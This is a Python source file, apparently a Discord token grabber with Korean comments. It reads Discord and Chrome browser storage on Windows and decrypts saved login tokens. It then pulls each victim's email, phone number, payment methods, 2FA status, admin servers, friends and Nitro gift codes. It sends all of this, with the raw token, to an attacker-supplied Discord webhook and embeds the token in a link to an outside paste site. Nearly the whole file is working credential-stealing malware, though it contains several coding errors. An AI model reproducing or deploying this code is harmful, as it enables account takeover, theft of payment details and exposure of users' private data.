import base64
import json
import os
import re

import requests
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData

def token(webhook: str) -> None:
    # 토큰 얻는 코드
    upload(webhook).upload()

class extract_tokens:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"

        self.appdata_path = os.getenv("localappdata") # 경로 지정 파트
        self.roadming_path = os.getenv("appdata")

        # 정규식 지정 파트
        self.regexp = r"[\w-]{24}\.[w-]{6}\.[w-]{25,110}" # 디스코드 코큰을 찾기 위한 정규식
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.token, self.uid = [], [] # 리스트에 만들어서 저장할 것.
        path = { # 각 프로그램의 경로
            'Discord' : self.roaming_path + '\\discord\\Local Storage\\leveldb',
            'Chrome': self.appdata_path + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\', # 크롬 프로필 별로 구분(최대 5)
            'Chrome3': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        }

        for fname, fpath in path.items():
            if not os.path.exists(path):
                continue
            __DISCORD__ = fname.replace(" ", "").lower()
            if "cord" in fpath:
                if not os.path.exists(self.roadming_path+f'\\{__DISCORD__}\\Local State'):
                    continue # 경로가 없다고 당황하지 않기.
                for f_name in os.listdir(fpath):
                    if f_name[-3:] not in ["log", "ldb"]: # 확장자(3글자)가 log나 ldb가 아닐 경우
                        continue # 계속 해야지 뭘 어째
                    for line in [x.strip() for x in open(f'{fpath}\\{f_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            tok = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{__DISCORD__}\\Local State'))
                            
                            if self.validate_token(tok): # 토큰 존재여부 확인
                                ud = requests.get(self.base_url, headers={'Authorization': tok}).json()['id'] # 디스코드 api로부터 해당하는 id를 가져옴
                                if ud not in self.uid: # 그 토큰의 소유자가 있고, 아이디가 현재 배열에 없다면
                                    self.token.append(tok) # 토큰 집어넣고
                                    self.uid.append(ud) # uid도 집어넣기
            else: # 디스코드 파일이 없어...?
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{f_name}', errors='ignore').readlines() if x.strip()]:
                        for tok in re.findall(self.regexp, line):
                            if self.validate_token(tok):
                                ud = requests.get(self.base_url, headers={'Authorization': tok}).json()['id']
                                if ud not in self.uids:
                                    self.token.append(tok)
                                    self.uid.append(ud)  

    def validate_token(self, token: str) -> bool: # 존재 여부를 판단하기에 불이 적합하다고 생각함
        req = requests.get(self.base_url, headers={'Authorization': token})

        if req.status_code == 200:
            return True # 200은, 응답이 정상적으로 처리되었다는 뜻이다.
            # 즉 토큰이 존재한다는 것
        
        return False # Else 문을 쓸 필요가 없는게, if에서 걸러지면 어짜피 프로그램을 나가는데 여기까지 온다는 것은 if에서 안 걸러짐을 의미.
    
    def decrypt_val(self, buff: bytes, masterkey: bytes) -> str: # 아래 내용(decrypt_val, get_master_key는 디스코드에서 얻음)
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(masterkey, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass
class upload():
    def __init__(self, webhook: str):
        self.tokens = extract_tokens().tokens
        self.webhook = SyncWebhook.from_url(webhook) # 웹훅으로 통신
    
    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:968704541946167357>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:968704542021652560>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "<:hypersquad_events:968704541774192693>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:968704541677723648>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:968704541501571133>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:968704541883261018>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:968704541874860082>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:968704542126510090>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "<:bug_hunter_2:968704541774217246>",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:968704541702905886>",
                "shift": 17,
                "ind": 131072
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:988996447938674699>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "⌨",
                "shift": 20,
                "ind": 1048704
            },
        }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

    def upload(self):
        if not self.tokens:
            return

        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            badges = ' '.join([flag[0] for flag in self.calc_flags(user['public_flags'])])
            
            if 'premium_type' in user:
                nitro = 'Nitro Classic' if user['premium_type'] == 1 else 'Nitro Boost'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []

                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('💳')
                    
                    elif method['type'] == 2:
                        payment_methods.append("<:paypal:973417655627288666>")

                    else:
                        payment_methods.append('❓')

                payment_methods = ', '.join(payment_methods)

            else:
                payment_methods = None

            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = True if guild['permissions'] == '4398046511103' else False
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = "✅" if guild['owner'] else "❌"

                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0:
                            invite = f"https://discord.gg/{invites[0]['code']}"
                        else:
                            invite = "HACKED!"

                        hq_guilds.append(f"\u200b\n**{guild['name']} ({guild['id']})** \n 섭주인: `{owner}` | 멤버수: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[서버 참가]({invite})")

                if len(hq_guilds) > 0:
                    hq_guilds = '\n'.join(hq_guilds)
                
                else:
                    hq_guilds = None

            else:
                hq_guilds = None

            if friends:
                hq_friends = []
                for friend in friends:
                    unprefered_flags = [64, 128, 256, 1048704]
                    inds = [flag[1] for flag in self.calc_flags(
                        friend['user']['public_flags'])[::-1]]
                    for flag in unprefered_flags:
                        inds.remove(flag) if flag in inds else None
                    if inds != []:
                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                            friend['user']['public_flags'])[::-1]])
                        hq_friends.append(f'{hq_badges} - `{friend["user"]["username"]}#{friend["user"]["discriminator"]} ({friend["user"]["id"]})`')  

                if len(hq_friends) > 0:
                    hq_friends = '\n'.join(hq_friends)

                else:
                    hq_friends = None

            else:
                hq_friends = None
            
            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']

                    codes.append(f":gift: `{name}`\n:ticket: `{code}`")

                if len(codes) > 0:
                    codes = '\n\n'.join(codes)
                
                else:
                    codes = None
            
            else:
                codes = None

            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
            embed.set_thumbnail(url=avatar)

            embed.add_field(name="<a:pinkcrown:996004209667346442> 토큰:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
            embed.add_field(name="<a:nitroboost:996004213354139658> 니트로:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:redboost:996004230345281546> 뱃지:", value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:pinklv:996004222090891366> 결제수단:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
            embed.add_field(name="<:mfa:1021604916537602088> 2차인증여부:", value=f"{mfa}", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)
            
            embed.add_field(name="<a:rainbowheart:996004226092245072> 이메일:", value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<:starxglow:996004217699434496> 전번:", value=f"{phone if phone != None else 'None'}", inline=True)    

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            if hq_guilds != None:
                embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)
           
            if hq_friends != None:
                embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if codes != None:
                embed.add_field(name="<a:gift:1021608479808569435> 니트로 선물 코드:", value=codes, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.set_footer(text="github.com/Lier0102")

            self.webhook.send(embed=embed, username="ABYPASS", avatar_url="sex.com")